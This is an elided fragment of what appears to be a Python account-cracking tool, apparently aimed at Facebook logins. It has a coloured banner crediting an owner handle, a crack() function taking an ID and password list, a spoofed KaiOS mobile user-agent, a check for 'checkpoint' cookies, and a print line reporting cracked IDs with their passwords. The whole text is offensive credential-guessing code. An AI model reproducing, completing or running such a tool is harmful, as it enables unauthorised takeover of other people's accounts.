...
\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m╔══\033[0;32m[•] BATA
\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m╠══\033[0;91m[•] @i4m_bata
...
def crack(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[1;34m└[ BATAm709❌CP ] ID : {idf}  [+] PASSWORD : {pw}{N} ')       
